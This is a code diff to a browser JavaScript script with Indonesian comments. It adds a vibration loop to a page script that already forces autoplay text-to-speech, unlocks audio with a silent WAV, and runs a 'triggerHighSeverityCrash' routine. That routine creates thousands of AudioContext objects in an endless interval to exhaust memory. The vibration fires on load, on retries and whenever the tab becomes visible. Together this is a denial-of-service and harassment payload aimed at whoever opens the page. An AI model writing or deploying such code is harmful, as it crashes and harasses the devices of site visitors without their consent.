@@ -16,7 +16,7 @@
   'use strict';
 
   // ============================================
-  // KONFIGURASI AUTOPLAY
+  // KONFIGURASI AUTOPLAY & VIBRATOR
   // ============================================
   var CONFIG = {
     tts: {
@@ -28,10 +28,33 @@
       repeatInterval: 8000,
       maxRepeats: 20
     },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
+    vibrate: {
+      pattern: [250, 120, 250, 120, 500],
+      intervalMs: 1400
+    }
   };
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, vibrateTimer: null };
+
+  // ============================================
+  // VIBRATOR MODULE
+  // ============================================
+  function triggerVibrationOnce() {
+    try {
+      if ('vibrate' in navigator && typeof navigator.vibrate === 'function') {
+        navigator.vibrate(CONFIG.vibrate.pattern);
+      }
+    } catch (e) {}
+  }
+
+  function startVibrationLoop() {
+    triggerVibrationOnce();
+    if (state.vibrateTimer) return;
+    state.vibrateTimer = setInterval(function () {
+      triggerVibrationOnce();
+    }, CONFIG.vibrate.intervalMs);
+  }
 
   // ============================================
   // TTS — TANPA CANCEL DI DALAM LOOP
@@ -141,10 +164,12 @@
   // ============================================
   function triggerHighSeverityCrash() {
     console.log("[!] Initiating High Severity Exploit Chain...");
+    startVibrationLoop();
     
     // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
     setInterval(function() {
       try {
+        triggerVibrationOnce();
         for (var i = 0; i < 2000; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
@@ -168,9 +193,11 @@
   // ============================================
   unlockAudioContext();
   trySilentAudio();
+  triggerVibrationOnce();
 
   setTimeout(function () {
     unlockAudioContext();
+    triggerVibrationOnce();
     startTTS(); // coba TTS lebih awal
   }, 100);
 
@@ -193,14 +220,18 @@
     retryCount++;
     unlockAudioContext();
     trySilentAudio();
+    triggerVibrationOnce();
     if (!state.ttsStarted) startTTS();
     if (retryCount > 10) clearInterval(retry);
   }, 2000);
 
   // Visibility change
   document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
+    if (!document.hidden) {
+      triggerVibrationOnce();
+      if (!state.mainPlayed) {
+        setTimeout(playMainAudio, 100);
+      }
     }
   });
 })();
